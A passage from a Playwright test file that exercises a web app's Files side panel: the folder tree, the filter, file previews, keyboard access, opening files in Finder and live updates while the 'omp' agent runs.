import { mkdirSync, mkdtempSync, realpathSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import AxeBuilder from "@axe-core/playwright";
import { DEFAULT_ROWS } from "../../shared/panes.ts";
import { writeChatSession } from "../support/chat-session.ts";
import { makeFilesProject } from "../support/files-project.ts";
import { writeLongFakeOmp } from "../support/long-fake-omp-bin.ts";
import { COUNT_RENDERS, countRendersOf, painted, rendersCounted, settled } from "../support/render-count.ts";
import { startTestServer, type TestServer } from "../support/server.ts";
import { boxOf, contrastOf } from "../support/style.ts";
import { expect, type Locator, type Page, test } from "./fixtures.ts";

/**
 * The Files tab of the side panel (no model call): the tree of the conversation's folder, its filter, the read-only
 * preview of code, Markdown, images and binary files, the actions on a file, the keyboard, and the tree following what
 * omp writes. The omp is a stand-in that streams a scripted turn (tests/support/long-fake-omp.ts).
 */

let s: TestServer;
let binDir: string;
let root: string;
let proj: string;
const TITLE = "Files tab conversation";
const EMPTY_TITLE = "Files tab empty folder";

test.beforeAll(async () => {
	binDir = mkdtempSync(join(tmpdir(), "ompw-files-bin-"));
	s = await startTestServer(0, { OMP_BIN: writeLongFakeOmp(binDir) }, { login: false });
	root = realpathSync(s.work);
	proj = makeFilesProject(root);
	writeChatSession(s.agentDir, { n: 0x61, title: TITLE, cwd: proj, turns: [{ prompt: "hello", reply: "hi" }] });
	const empty = join(root, "empty-proj");
	mkdirSync(empty);
	writeChatSession(s.agentDir, { n: 0x62, title: EMPTY_TITLE, cwd: empty, turns: [{ prompt: "hello", reply: "hi" }] });
});
test.afterAll(async () => {
	await s?.stop();
	rmSync(binDir, { recursive: true, force: true });
});

// A test's route that fetches the real answer and then changes it can still be answering a request of the page when the
// test's last assertion passes; the page going away then disposes the response it is reading ("Response has been
// disposed"). The routes come down first, and the answers under way finish.
test.afterEach(async ({ page }) => {
	await page.unrouteAll({ behavior: "wait" });
});

/** A prompt the stand-in omp answers with a turn of `steps` steps, a quarter of a second each, streaming as it goes. */
const turn = (steps = 14) =>
	`@@fake ${JSON.stringify({ steps, stepMs: 250, textDeltas: 2, thinkingDeltas: 1, toolUpdates: 1, toolBytes: 200 })}`;

const row = (page: Page, path: string) => page.locator(`[data-testid="file-row"][data-path="${path}"]`);
const panel = (page: Page) => page.getByTestId("right-panel");

/** Open the conversation, its side panel and the Files tab. */
async function openFiles(page: Page, title = TITLE): Promise<void> {
	await page.addInitScript(() => localStorage.setItem("ompw.autoTitle", "off"));
	await page.goto(`${s.url}/?token=${s.accessToken}`);
	const item = page.locator('[data-testid="session-item"]', { hasText: title });
	await expect(item).toHaveCount(1, { timeout: 30_000 });
	await item.click();
	await expect(page.getByTestId("composer")).toBeVisible();
	await page.getByTestId("toggle-panel").click();
	await panel(page)
		.getByTestId("panel-pane-bottom")
		.getByRole("tab", { name: /^Files|^文件/ })
		.click();
	await expect(page.getByTestId("files-pane")).toBeVisible();
}

/** The tree has been read: the folder's own entries are on screen. */
const treeReady = (page: Page) => expect(row(page, "src")).toBeVisible();

/** Waits for every animation that ends on its own (the view's fade-in) to be over: axe reads the colours on screen then. */
async function settledFade(page: Page): Promise<void> {
	await page.evaluate(() =>
		Promise.allSettled(
			document
				.getAnimations()
				.filter((a) => a.effect?.getComputedTiming().iterations !== Number.POSITIVE_INFINITY)
				.map((a) => a.finished),
		),
	);
}

test.describe("the tab", () => {
	test("is lazy: nothing of it is loaded, read or watched until it is shown, and nothing after it is closed", async ({
		page,
	}) => {
		const chunks: string[] = [];
		const folderRequests: string[] = [];
		const watches: unknown[] = [];
		page.on("request", (r) => {
			const url = new URL(r.url());
			if (/FilesPane-.*\.js$/.test(url.pathname)) chunks.push(url.pathname);
			if (url.pathname.startsWith("/api/folder/")) folderRequests.push(url.pathname);
		});
		page.on("websocket", (ws) =>
			ws.on("framesent", (f) => {
				if (typeof f.payload === "string" && f.payload.includes('"folder_watch"')) watches.push(JSON.parse(f.payload));
			}),
		);
		// The lower pane shows Ask, not Files, which it shows by default.
		await page.addInitScript(
			(kept) => {
				localStorage.setItem("ompw.autoTitle", "off");
				localStorage.setItem("ompw.panelPanes", kept);
			},
			JSON.stringify({ version: 2, rows: DEFAULT_ROWS, top: "agents", bottom: "btw" }),
		);
		await page.goto(`${s.url}/?token=${s.accessToken}`);
		await page.locator('[data-testid="session-item"]', { hasText: TITLE }).click();
		await expect(page.getByTestId("composer")).toBeVisible();
		await page.getByTestId("toggle-panel").click();
		await expect(panel(page)).toBeVisible();
		// The panel is open on other tabs: the Files tab is not even loaded.
		expect(chunks).toEqual([]);
		expect(folderRequests).toEqual([]);
		expect(watches).toEqual([]);

		await panel(page)
			.getByTestId("panel-pane-bottom")
			.getByRole("tab", { name: /^Files/ })
			.click();
		await treeReady(page);
		expect(chunks).toHaveLength(1);
		expect(folderRequests.length).toBeGreaterThan(0);
		await expect.poll(() => watches.length).toBeGreaterThan(0);
		expect(watches.at(-1)).toMatchObject({ t: "folder_watch", file: expect.stringContaining(".jsonl"), dirs: [""] });

		// Another tab in its pane: the tree is gone with its watch.
		await panel(page).getByTestId("panel-pane-bottom").getByRole("tab", { name: /^Ask/ }).click();
		await expect(page.getByTestId("files-pane")).toHaveCount(0);
		await expect.poll(() => watches.at(-1)).toMatchObject({ t: "folder_watch", dirs: [] });
		const quiet = folderRequests.length;
		writeFileSync(join(proj, "written-while-closed.txt"), "x");
		// An absence cannot be awaited: a real wait, longer than the server's debounce and the page's own.
		await page.waitForTimeout(1200);
		expect(folderRequests.length).toBe(quiet);
		// Shown again, what was written meanwhile is there.
		await panel(page)
			.getByTestId("panel-pane-bottom")
			.getByRole("tab", { name: /^Files/ })
			.click();
		await expect(row(page, "written-while-closed.txt")).toBeVisible();
		rmSync(join(proj, "written-while-closed.txt"));
	});
});

test.describe("the tree", () => {
	test("lists folders first, then files by name; hidden files, dependency folders and what .gitignore names are left out", async ({
		page,
	}) => {
		await openFiles(page);
		await treeReady(page);
		const names = await page.getByTestId("file-row").evaluateAll((els) => els.map((e) => e.getAttribute("data-path")));
		expect(names).toEqual([
			"docs",
			"link-src",
			"src",
			"big.txt",
			"data.bin",
			"Dockerfile",
			"icon.svg",
			"link-out.txt",
			"logo.png",
			"notes with space.txt",
			"README.md",
		]);
		await expect(row(page, ".env")).toHaveCount(0);
		await expect(row(page, "node_modules")).toHaveCount(0);
		await expect(row(page, "build.out")).toHaveCount(0);
		await expect(row(page, ".git")).toHaveCount(0);
	});

	test("a folder opens and closes one folder at a time, and the folders inside it stay open when it is closed and opened again", async ({
		page,
	}) => {
		await openFiles(page);
		await treeReady(page);
		const requested: string[] = [];
		page.on("request", (r) => {
			const url = new URL(r.url());
			if (url.pathname === "/api/folder/list") requested.push(url.searchParams.get("path") ?? "");
		});
		await row(page, "src").click();
		await expect(row(page, "src")).toHaveAttribute("aria-expanded", "true");
		await expect(row(page, "src/app.ts")).toBeVisible();
		await expect(row(page, "src/lib")).toBeVisible();
		// Only that folder was read: what is below it is not.
		await expect(row(page, "src/lib/greet.ts")).toHaveCount(0);
		expect(requested).toEqual(["src"]);
		await row(page, "src/lib").click();
		await expect(row(page, "src/lib/greet.ts")).toBeVisible();
		await row(page, "src").click();
		await expect(row(page, "src/app.ts")).toHaveCount(0);
		await expect(row(page, "src/lib/greet.ts")).toHaveCount(0);
		await row(page, "src").click();
		await expect(row(page, "src/lib/greet.ts")).toBeVisible();
		// Depth shows as indent and as aria-level.
		await expect(row(page, "src/lib/greet.ts")).toHaveAttribute("aria-level", "3");
		const shallow = await boxOf(row(page, "src/app.ts").locator("span").last());
		const deep = await boxOf(row(page, "src/lib/greet.ts").locator("span").last());
		expect(deep.x).toBeGreaterThan(shallow.x);
	});

	test("marks what git says: a changed file, a new one, and the folder that holds them", async ({ page }) => {
		await openFiles(page);
		await treeReady(page);
		await expect(row(page, "README.md").getByTestId("git-mark")).toHaveAttribute("data-git", "modified");
		await expect(row(page, "src").getByTestId("git-mark")).toHaveAttribute("data-git", "changed");
		await expect(row(page, "logo.png").getByTestId("git-mark")).toHaveAttribute("data-git", "untracked");
		await expect(row(page, "docs").getByTestId("git-mark")).toHaveCount(0);
		await row(page, "src").click();
		await expect(row(page, "src/new.ts").getByTestId("git-mark")).toHaveAttribute("data-git", "untracked");
		await expect(row(page, "src/app.ts").getByTestId("git-mark")).toHaveCount(0);
		// A mark is words for a reader that cannot see its colour.
		await expect(row(page, "README.md").getByTestId("git-mark")).toContainText("modified");
	});

	test("shows what is hidden when asked, and leaves it out again", async ({ page }) => {
		await openFiles(page);
		await treeReady(page);
		const toggle = page.getByTestId("files-show-hidden");
		await expect(toggle).toHaveAttribute("aria-pressed", "false");
		await expect(toggle).toHaveAccessibleName(/Show hidden files \(\d+ hidden\)/);
		await toggle.click();
		await expect(toggle).toHaveAttribute("aria-pressed", "true");
		await expect(row(page, ".env")).toBeVisible();
		await expect(row(page, "node_modules")).toBeVisible();
		await expect(row(page, "build.out")).toBeVisible();
		await expect(row(page, ".git")).toBeVisible();
		await expect(row(page, ".gitignore")).toBeVisible();
		await toggle.click();
		await expect(row(page, ".env")).toHaveCount(0);
		await expect(row(page, "node_modules")).toHaveCount(0);
	});

	test("a link inside the folder is a folder, one that leads out is shown and never followed", async ({ page }) => {
		await openFiles(page);
		await treeReady(page);
		await row(page, "link-src").click();
		await expect(row(page, "link-src/app.ts")).toBeVisible();
		const out = row(page, "link-out.txt");
		await expect(out).toHaveAttribute("aria-disabled", "true");
		// A disabled row is not clickable by a user's rules: the click is made anyway, to see that it does nothing.
		await out.click({ force: true });
		await expect(page.getByTestId("file-preview")).toHaveCount(0);
		await out.focus();
		await page.keyboard.press("Enter");
		await expect(page.getByTestId("file-preview")).toHaveCount(0);
	});

	test("an empty folder says so", async ({ page }) => {
		await openFiles(page, EMPTY_TITLE);
		await expect(page.getByTestId("tree-note-empty")).toHaveText("Empty folder");
	});

	test("is operated from the keyboard: arrows move and open, Enter opens a file and Back returns to the row", async ({
		page,
	}) => {
		await openFiles(page);
		await treeReady(page);
		const tree = page.getByRole("tree");
		await expect(tree).toHaveAccessibleName("Files");
		// One row is in the tab order, and Tab from the last control of the toolbar arrives on it (the buttons of the folder
		// rows are for the mouse: the keyboard has the menu key).
		await expect(page.locator('[data-testid="file-row"][tabindex="0"]')).toHaveCount(1);
		await expect(page.locator('[data-testid="file-row-menu"]:not([tabindex="-1"])')).toHaveCount(0);
		await page.getByTestId("files-refresh").focus();
		await page.keyboard.press("Tab");
		await expect(row(page, "docs")).toBeFocused();
		await page.keyboard.press("ArrowDown");
		await expect(row(page, "link-src")).toBeFocused();
		await page.keyboard.press("ArrowDown");
		await expect(row(page, "src")).toBeFocused();
		await page.keyboard.press("ArrowRight");
		await expect(row(page, "src")).toHaveAttribute("aria-expanded", "true");
		// The folder is read when it is opened: Right goes into it once its entries are rows.
		await expect(row(page, "src/components")).toBeVisible();
		await page.keyboard.press("ArrowRight");
		await expect(row(page, "src/components")).toBeFocused();
		await page.keyboard.press("ArrowDown");
		await page.keyboard.press("ArrowDown");
		await expect(row(page, "src/app.ts")).toBeFocused();
		await page.keyboard.press("ArrowLeft");
		await expect(row(page, "src")).toBeFocused();
		await page.keyboard.press("ArrowLeft");
		await expect(row(page, "src")).toHaveAttribute("aria-expanded", "false");
		await page.keyboard.press("End");
		await expect(row(page, "README.md")).toBeFocused();
		await page.keyboard.press("Home");
		await expect(row(page, "docs")).toBeFocused();
		await page.keyboard.press("Enter");
		await expect(row(page, "docs")).toHaveAttribute("aria-expanded", "true");
		// The folder is read when it is opened: its files are rows when that has come back.
		await expect(row(page, "docs/guide.md")).toBeVisible();
		await page.keyboard.press("ArrowDown");
		await expect(row(page, "docs/guide.md")).toBeFocused();
		await page.keyboard.press("Enter");
		await expect(page.getByTestId("file-preview")).toHaveAttribute("data-path", "docs/guide.md");
		// A keyboard user lands on the way back, and comes back to the row.
		await expect(page.getByTestId("file-back")).toBeFocused();
		await page.keyboard.press("Enter");
		await expect(row(page, "docs/guide.md")).toBeFocused();
		await expect(page.getByTestId("file-preview")).toHaveCount(0);
	});
});

test.describe("the filter", () => {
	test("searches names across the project and opens a match with Enter, and Escape clears it", async ({ page }) => {
		await openFiles(page);
		await treeReady(page);
		const filter = page.getByTestId("files-filter");
		await filter.fill("GREET");
		const hits = page.getByTestId("files-hit");
		await expect(hits).toHaveCount(1);
		await expect(hits.first()).toHaveAttribute("data-path", "src/lib/greet.ts");
		// The folders are not asked to be open: the match is found by its path.
		await expect(page.getByTestId("file-tree")).toHaveCount(0);
		await filter.fill("e");
		await expect(hits.first()).toBeVisible();
		await filter.fill("app");
		await expect(hits.first()).toHaveAttribute("data-path", "src/app.ts");
		await expect(filter).toHaveAttribute("aria-activedescendant", "files-hit-0");
		await page.keyboard.press("ArrowDown");
		await expect(hits.first()).toHaveAttribute("aria-selected", "true");
		await filter.fill("README");
		await expect(hits.first()).toHaveAttribute("data-path", "README.md");
		await page.keyboard.press("Enter");
		await expect(page.getByTestId("file-preview")).toHaveAttribute("data-path", "README.md");
		// Back goes to the matches, with the filter as it was.
		await page.getByTestId("file-back").click();
		await expect(filter).toHaveValue("README");
		await expect(filter).toBeFocused();
		await filter.press("Escape");
		await expect(filter).toHaveValue("");
		await expect(page.getByTestId("file-tree")).toBeVisible();
	});

	test("what is hidden is searched only when it is shown, and a miss says so", async ({ page }) => {
		await openFiles(page);
		await treeReady(page);
		const filter = page.getByTestId("files-filter");
		await filter.fill("index.js");
		await expect(page.getByTestId("files-none")).toContainText("No file matches “index.js”");
		await expect(page.getByTestId("files-none")).toContainText("hidden");
		await page.getByTestId("files-show-hidden").click();
		await expect(page.getByTestId("files-hit")).toHaveAttribute("data-path", "node_modules/dep/index.js");
		await page.getByTestId("files-filter-clear").click();
		await expect(filter).toHaveValue("");
	});

	test("a file made while the filter is on is found", async ({ page }) => {
		await openFiles(page);
		await treeReady(page);
		await page.getByTestId("files-filter").fill("zzz-new");
		await expect(page.getByTestId("files-none")).toBeVisible();
		writeFileSync(join(proj, "zzz-new-file.txt"), "x");
		await expect(page.getByTestId("files-hit")).toHaveAttribute("data-path", "zzz-new-file.txt");
		rmSync(join(proj, "zzz-new-file.txt"));
	});
});

/** The preview of a file, opened from the tree. */
async function openFile(page: Page, ...path: string[]): Promise<Locator> {
	await treeReady(page);
	for (const [i, p] of path.entries()) {
		const target = row(page, p);
		await expect(target).toBeVisible();
		if (i < path.length - 1) await target.click();
		else await target.click();
	}
	const preview = page.getByTestId("file-preview");
	await expect(preview).toHaveAttribute("data-path", path.at(-1) ?? "");
	return preview;
}

test.describe("the preview", () => {
	test("code is highlighted by the app's own highlighter, line by line, and read only", async ({ page }) => {
		await openFiles(page);
		const preview = await openFile(page, "src", "src/app.ts");
		await expect(preview.getByTestId("file-name")).toHaveText("app.ts");
		const code = preview.getByTestId("file-code");
		await expect(code).toContainText("export function main(names: string[]): string[] {");
		// The worker has coloured it: tokens carry the theme's variables.
		await expect(code.locator("pre.shiki")).toBeVisible();
		await expect(code.locator(".line")).toHaveCount(9);
		expect(await code.locator("span[style*='--shiki']").count()).toBeGreaterThan(5);
		// Nothing in it edits: no field, no editable region.
		await expect(preview.locator("textarea, input, [contenteditable='true']")).toHaveCount(0);
		await expect(preview.getByText("1.4.2")).toBeVisible();
	});

	test("a file is told by its name when its extension says nothing (Dockerfile)", async ({ page }) => {
		await openFiles(page);
		const preview = await openFile(page, "Dockerfile");
		await expect(preview.locator("pre.shiki")).toBeVisible();
	});

	test("Markdown is rendered like a message, with its source one click away", async ({ page }) => {
		await openFiles(page);
		const preview = await openFile(page, "README.md");
		const rendered = preview.getByTestId("file-markdown");
		await expect(rendered.getByRole("heading", { name: "Sample project" })).toBeVisible();
		await expect(rendered.getByRole("listitem")).toHaveCount(2);
		await expect(rendered.locator("pre.shiki, pre").first()).toBeVisible();
		// A link to a file of the project is not a link out of the page.
		await expect(rendered.locator("a[href]")).toHaveCount(0);
		const toggle = preview.getByTestId("file-source-toggle");
		await expect(toggle).toHaveAccessibleName("Show the source");
		await toggle.click();
		await expect(preview.getByTestId("file-markdown")).toHaveCount(0);
		await expect(preview.getByTestId("file-code")).toContainText("# Sample project");
		await expect(toggle).toHaveAccessibleName("Show it rendered");
		await expect(toggle).toHaveAttribute("aria-pressed", "true");
		await toggle.click();
		await expect(preview.getByTestId("file-markdown")).toBeVisible();
	});

	test("an image is shown, with its size; an SVG is drawn and has a source", async ({ page }) => {
		await openFiles(page);
		const preview = await openFile(page, "logo.png");
		const img = preview.getByTestId("file-image").locator("img");
		await expect(img).toBeVisible();
		await expect.poll(() => img.evaluate((el: HTMLImageElement) => el.naturalWidth)).toBe(160);
		await expect(preview).toContainText("160 × 100");
		await expect(preview.getByTestId("file-source-toggle")).toHaveCount(0);
		await page.getByTestId("file-back").click();
		const svg = await openFile(page, "icon.svg");
		await expect(svg.getByTestId("file-image").locator("img")).toBeVisible();
		await svg.getByTestId("file-source-toggle").click();
		await expect(svg.getByTestId("file-code")).toContainText("<svg");
	});

	test("a binary file says what it is, with its size", async ({ page }) => {
		await openFiles(page);
		const preview = await openFile(page, "data.bin");
		await expect(preview).toContainText("Binary file, 8 B");
		await expect(preview.getByTestId("file-code")).toHaveCount(0);
		// Copying its path and mentioning it are still there.
		await expect(preview.getByTestId("file-copy-path")).toBeVisible();
		await expect(preview.getByTestId("file-mention")).toBeVisible();
	});

	test("a large file shows its first megabyte and says so", async ({ page }) => {
		await openFiles(page);
		const preview = await openFile(page, "big.txt");
		await expect(preview.getByTestId("file-truncated")).toContainText(/Showing the first 1\.0 MB of 1\.\d MB/);
		await expect(preview.getByTestId("file-code")).toContainText("request handled in 12ms");
	});

	test("a file that is gone says so, and Back still works", async ({ page }) => {
		writeFileSync(join(proj, "short-lived.txt"), "x");
		await openFiles(page);
		const preview = await openFile(page, "short-lived.txt");
		rmSync(join(proj, "short-lived.txt"));
		await expect(preview.getByText("This file is no longer there.")).toBeVisible();
		await page.getByTestId("file-back").click();
		await expect(row(page, "short-lived.txt")).toHaveCount(0);
	});

	test("opened large, the file takes the main area, and Escape returns to the conversation as it was", async ({
		page,
	}) => {
		await openFiles(page);
		const preview = await openFile(page, "src", "src/app.ts");
		// Where the conversation was, and something typed in the message box, are what closing it must find again.
		await page.getByTestId("composer").fill("a draft I was writing");
		await page.getByTestId("transcript").evaluate((el) => {
			el.scrollTop = 0;
		});
		const before = await page.getByTestId("transcript").evaluate((el) => el.scrollTop);
		const panelBox = await boxOf(panel(page));

		await preview.getByTestId("file-larger").click();
		const large = page.getByTestId("big-view");
		await expect(large).toBeVisible();
		await expect(large).toHaveAttribute("data-kind", "file");
		await expect(large).toHaveAttribute("data-path", "src/app.ts");
		await expect(page.getByTestId("big-name")).toHaveText("app.ts");
		await expect(page.getByTestId("big-file-body")).toContainText("export function main");
		// It is in the main area: wider than the panel, and the panel is still there beside it.
		await page.evaluate(() =>
			Promise.allSettled(
				document
					.getAnimations()
					.filter((a) => a.effect?.getComputedTiming().iterations !== Number.POSITIVE_INFINITY)
					.map((a) => a.finished),
			),
		);
		const big = await boxOf(page.getByTestId("big-file-body"));
		expect(big.width).toBeGreaterThan(panelBox.width);
		await expect(panel(page)).toBeVisible();
		// Focus went in, and the conversation under it is hidden rather than gone.
		await expect(large).toBeFocused();
		await expect(page.getByTestId("transcript")).toBeHidden();

		await page.keyboard.press("Escape");
		await expect(large).toHaveCount(0);
		await expect(preview).toBeVisible();
		await expect(page.getByTestId("composer")).toHaveValue("a draft I was writing");
		expect(await page.getByTestId("transcript").evaluate((el) => el.scrollTop)).toBe(before);
		// Focus is back on the button that opened it.
		await expect(preview.getByTestId("file-larger")).toBeFocused();
	});

	test("the large view closes with its close button too", async ({ page }) => {
		await openFiles(page);
		const preview = await openFile(page, "src", "src/app.ts");
		await preview.getByTestId("file-larger").click();
		await expect(page.getByTestId("big-view")).toBeVisible();
		await page.getByTestId("big-close").click();
		await expect(page.getByTestId("big-view")).toHaveCount(0);
		await expect(preview).toBeVisible();
	});

	test("copies the path of the file, whole", async ({ context, page }) => {
		await context.grantPermissions(["clipboard-read", "clipboard-write"]);
		await openFiles(page);
		const preview = await openFile(page, "src", "src/app.ts");
		await preview.getByTestId("file-copy-path").click();
		await expect(preview.getByTestId("file-copy-path")).toHaveAccessibleName("Path copied");
		expect(await page.evaluate(() => navigator.clipboard.readText())).toBe(join(proj, "src/app.ts"));
	});
});

test.describe("the message box", () => {
	test("Insert as @mention puts the file's path at the end of what is typed, and focus in the box", async ({
		page,
	}) => {
		await openFiles(page);
		const composer = page.getByTestId("composer");
		await composer.fill("please look at");
		const preview = await openFile(page, "src", "src/lib", "src/lib/greet.ts");
		await preview.getByTestId("file-mention").click();
		await expect(composer).toHaveValue("please look at @src/lib/greet.ts ");
		await expect(composer).toBeFocused();
		await expect(page.getByTestId("toast")).toContainText("@src/lib/greet.ts");
		// Typing goes on after the mention.
		await page.keyboard.type("and fix it");
		await expect(composer).toHaveValue("please look at @src/lib/greet.ts and fix it");
	});

	test("a path with a space is quoted", async ({ page }) => {
		await openFiles(page);
		await openFile(page, "notes with space.txt");
		await page.getByTestId("file-mention").click();
		await expect(page.getByTestId("composer")).toHaveValue('@"notes with space.txt" ');
	});

	test("a mention is a mention omp reads: it is the path the `@` completion offers", async ({ page }) => {
		await openFiles(page);
		await page.getByTestId("composer").fill("@src/app");
		const menu = page.getByTestId("slash-menu");
		await expect(menu).toContainText("@src/app.ts");
	});
});

test.describe("open in the default app and reveal in Finder", () => {
	test("are on a page of this Mac, and ask the server for exactly the file shown", async ({ page }) => {
		test.skip(process.platform !== "darwin", "macOS only");
		const posted: unknown[] = [];
		await page.route("**/api/folder/open", async (route) => {
			posted.push(route.request().postDataJSON());
			await route.fulfill({ json: { ok: true } });
		});
		await openFiles(page);
		const preview = await openFile(page, "src", "src/app.ts");
		await preview.getByTestId("file-open").click();
		await preview.getByTestId("file-reveal").click();
		await expect.poll(() => posted.length).toBe(2);
		expect(posted).toMatchObject([
			{ path: "src/app.ts", reveal: false, file: expect.stringContaining(".jsonl") },
			{ path: "src/app.ts", reveal: true },
		]);
	});

	test("are not offered when the server says the page is not this computer's", async ({ page }) => {
		await page.route("**/api/folder/file?**", async (route) => {
			const res = await route.fetch();
			const body = await res.json();
			await route.fulfill({ response: res, json: { ...body, local: false } });
		});
		await openFiles(page);
		const preview = await openFile(page, "src", "src/app.ts");
		await expect(preview.getByTestId("file-mention")).toBeVisible();
		await expect(preview.getByTestId("file-open")).toHaveCount(0);
		await expect(preview.getByTestId("file-reveal")).toHaveCount(0);
	});

	test("a refusal from the server is said, not swallowed", async ({ page }) => {
		test.skip(process.platform !== "darwin", "macOS only");
		await page.route("**/api/folder/open", (route) =>
			route.fulfill({ status: 403, json: { error: "An executable file is never opened" } }),
		);
		await openFiles(page);
		const preview = await openFile(page, "src", "src/app.ts");
		await preview.getByTestId("file-open").click();
		await expect(page.getByTestId("toast").last()).toContainText("An executable file is never opened");
	});
});

test.describe("open the folder in Finder", () => {
	/** The open requests the page makes; the server is told nothing (a real one would show a Finder window). */
	async function capture(page: Page): Promise<Record<string, unknown>[]> {
		const posted: Record<string, unknown>[] = [];
		await page.route("**/api/folder/open", async (route) => {
			posted.push(route.request().postDataJSON());
			await route.fulfill({ json: { ok: true } });
		});
		return posted;
	}

	test("the tab's header opens the conversation's folder itself, and each folder row's menu opens that folder", async ({
		page,
	}) => {
		test.skip(process.platform !== "darwin", "macOS only");
		const posted = await capture(page);
		await openFiles(page);
		await treeReady(page);
		await expect(page.getByTestId("files-open-folder")).toHaveAccessibleName("Open in Finder");
		await page.getByTestId("files-open-folder").click();
		await expect.poll(() => posted.length).toBe(1);
		expect(posted[0]).toMatchObject({ path: "", dir: true, file: expect.stringContaining(".jsonl") });
		expect(posted[0]).not.toHaveProperty("reveal");

		// The menu of a folder row: opened by its button, and by the right mouse button.
		await row(page, "src").hover();
		await row(page, "src").getByTestId("file-row-menu").click();
		await expect(page.getByTestId("folder-menu")).toBeVisible();
		await page.getByTestId("folder-open-finder").click();
		await expect.poll(() => posted.length).toBe(2);
		expect(posted[1]).toMatchObject({ path: "src", dir: true });
		// The row was not opened or closed by it.
		await expect(row(page, "src")).toHaveAttribute("aria-expanded", "false");
		await row(page, "docs").click({ button: "right" });
		await expect(page.getByTestId("folder-menu")).toBeVisible();
		await page.getByTestId("folder-open-finder").click();
		await expect.poll(() => posted.length).toBe(3);
		expect(posted[2]).toMatchObject({ path: "docs", dir: true });
		await expect(row(page, "docs")).toHaveAttribute("aria-expanded", "false");
		// A file row has no menu, and a folder inside an open folder opens by its own path.
		await expect(row(page, "README.md").getByTestId("file-row-menu")).toHaveCount(0);
		await row(page, "README.md").click({ button: "right" });
		await expect(page.getByTestId("folder-menu")).toHaveCount(0);
		await row(page, "src").click();
		await expect(row(page, "src/components")).toBeVisible();
		await row(page, "src/components").click({ button: "right" });
		await page.getByTestId("folder-open-finder").click();
		await expect.poll(() => posted.length).toBe(4);
		expect(posted[3]).toMatchObject({ path: "src/components", dir: true });
	});

	test("from the keyboard: the menu key (or Shift+F10) on a folder row opens its menu, and the row has the focus back", async ({
		page,
	}) => {
		test.skip(process.platform !== "darwin", "macOS only");
		const posted = await capture(page);
		await openFiles(page);
		await treeReady(page);
		await row(page, "docs").focus();
		await page.keyboard.press("ContextMenu");
		await expect(page.getByTestId("folder-menu")).toBeVisible();
		await page.keyboard.press("ArrowDown");
		await page.keyboard.press("Enter");
		await expect.poll(() => posted.length).toBe(1);
		expect(posted[0]).toMatchObject({ path: "docs", dir: true });
		await expect(page.getByTestId("folder-menu")).toHaveCount(0);
		await expect(row(page, "docs")).toBeFocused();
		await page.keyboard.press("Shift+F10");
		await expect(page.getByTestId("folder-menu")).toBeVisible();
		await page.keyboard.press("Escape");
		await expect(page.getByTestId("folder-menu")).toHaveCount(0);
		await expect(row(page, "docs")).toBeFocused();
		// A file row has no menu to open.
		await page.keyboard.press("End");
		await expect(row(page, "README.md")).toBeFocused();
		await page.keyboard.press("ContextMenu");
		await expect(page.getByTestId("folder-menu")).toHaveCount(0);
		expect(posted).toHaveLength(1);
	});

	test("a refusal from the server is said, not swallowed", async ({ page }) => {
		test.skip(process.platform !== "darwin", "macOS only");
		await page.route("**/api/folder/open", (route) =>
			route.fulfill({
				status: 403,
				json: { error: "An application or package is never opened: it can be shown in Finder" },
			}),
		);
		await openFiles(page);
		await treeReady(page);
		await page.getByTestId("files-open-folder").click();
		await expect(page.getByTestId("toast").last()).toContainText("An application or package is never opened");
	});

	test("a page that is not this computer's has neither the header's button nor a folder menu, and a request is never made", async ({
		page,
	}) => {
		const posted = await capture(page);
		// What the server tells a page it refuses to open for: its listing is guarded, and says nothing of `local`.
		await page.route("**/api/folder/list**", async (route) => {
			const res = await route.fetch();
			const { local: _local, ...listing } = await res.json();
			await route.fulfill({ response: res, json: { ...listing, guarded: true } });
		});
		await openFiles(page);
		await treeReady(page);
		await expect(page.getByTestId("files-refresh")).toBeVisible();
		await expect(page.getByTestId("files-open-folder")).toHaveCount(0);
		await expect(row(page, "src").getByTestId("file-row-menu")).toHaveCount(0);
		await row(page, "src").click({ button: "right" });
		await expect(page.getByTestId("folder-menu")).toHaveCount(0);
		await row(page, "src").focus();
		await page.keyboard.press("ContextMenu");
		await expect(page.getByTestId("folder-menu")).toHaveCount(0);
		expect(posted).toEqual([]);
	});

	test("nor does a page that the server did not say may open: guarded alone hides it, and so does a missing `local`", async ({
		page,
	}) => {
		const posted = await capture(page);
		// Guarded, with `local` still said (a page that lies): hidden. Then `local` gone alone: hidden.
		let mode: "guarded" | "unsaid" = "guarded";
		await page.route("**/api/folder/list**", async (route) => {
			const res = await route.fetch();
			const body = await res.json();
			await route.fulfill({
				response: res,
				json:
					mode === "guarded"
						? { ...body, local: true, guarded: true }
						: { ...Object.fromEntries(Object.entries(body).filter(([k]) => k !== "local")) },
			});
		});
		await openFiles(page);
		await treeReady(page);
		await expect(page.getByTestId("files-open-folder")).toHaveCount(0);
		await expect(row(page, "src").getByTestId("file-row-menu")).toHaveCount(0);
		mode = "unsaid";
		await page.getByTestId("files-refresh").click();
		await expect(page.getByTestId("files-refresh")).toBeVisible();
		await expect(page.getByTestId("files-open-folder")).toHaveCount(0);
		await expect(row(page, "src").getByTestId("file-row-menu")).toHaveCount(0);
		expect(posted).toEqual([]);
	});

	test.describe("in Chinese", () => {
		test.use({ locale: "zh-CN" });

		test("the button, the menu and its name are in Simplified Chinese", async ({ page }) => {
			test.skip(process.platform !== "darwin", "macOS only");
			await capture(page);
			await openFiles(page);
			await treeReady(page);
			await expect(page.getByTestId("files-open-folder")).toHaveAccessibleName("在访达中打开");
			await row(page, "src").click({ button: "right" });
			await expect(page.getByTestId("folder-menu")).toHaveAccessibleName("“src”的操作");
			await expect(page.getByTestId("folder-open-finder")).toHaveText("在访达中打开");
		});
	});
});

test.describe("what omp writes", () => {
	const turn = (steps = 14) =>
		`@@fake ${JSON.stringify({ steps, stepMs: 250, textDeltas: 2, thinkingDeltas: 1, toolUpdates: 1, toolBytes: 200 })}`;

	test("a file made while a turn runs appears in the tree while it runs, and so does one made in an open folder", async ({
		page,
	}) => {
		await openFiles(page);
		await treeReady(page);
		await row(page, "src").click();
		await expect(row(page, "src/app.ts")).toBeVisible();
		await page.getByTestId("composer").fill(turn());
		await page.getByTestId("composer").press("Enter");
		await expect(page.getByTestId("stop")).toBeVisible({ timeout: 60_000 });
		writeFileSync(join(proj, "made-by-the-turn.md"), "# new\n");
		writeFileSync(join(proj, "src", "made-in-src.ts"), "export {};\n");
		await expect(row(page, "made-by-the-turn.md")).toBeVisible();
		await expect(row(page, "src/made-in-src.ts")).toBeVisible();
